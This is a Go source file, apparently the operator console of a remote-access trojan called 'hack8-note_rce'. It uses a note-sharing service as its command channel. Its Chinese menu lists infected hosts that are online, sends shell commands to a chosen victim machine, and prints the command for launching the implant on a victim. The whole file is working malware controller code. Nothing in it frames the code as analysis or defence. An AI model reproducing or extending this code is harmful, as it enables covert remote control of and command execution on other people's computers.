package main

import (
	"fmt"
	"github.com/lifei6671/gorand"
	"hack8-note_rce/Util"
)

func main() {
	var admin string
	fmt.Println("请输入主控地址(默认为ocis)：")
	fmt.Scan(&admin)

	fmt.Println("被控端运行命令 key参数制定notekey admin参数执行主控 ：\n./server --key notekey --")

	for {
		console := 0
		fmt.Println("\n\n1.获取在线主机列表(不一定全)\n2.执行主机命令(需要等待30秒)\n3.删除主机(可能主机被控木马已被杀掉,列表不会自动删除,需要手动删除)\n")
		fmt.Scan(&console)
		if console == 1 {
			list := Util.HostList(admin)
			for i := range list {
				fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey地址:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
			}
		} else if console == 2 {
			var noteid string
			var notekey string
			var command string

			fmt.Print("请输入note地址:")
			fmt.Scan(&noteid)
			fmt.Print("请输入notekey:")
			fmt.Scan(&notekey)
			fmt.Print("请输入shell命令:")
			fmt.Scan(&command)
			fmt.Println("请等待30秒")

			Util.Hostexec(noteid, notekey, command)

		} else if console == 3 {
			fmt.Println("功能暂未开发")

		} else {
			fmt.Println("功能暂未开发")
		}
	}
}
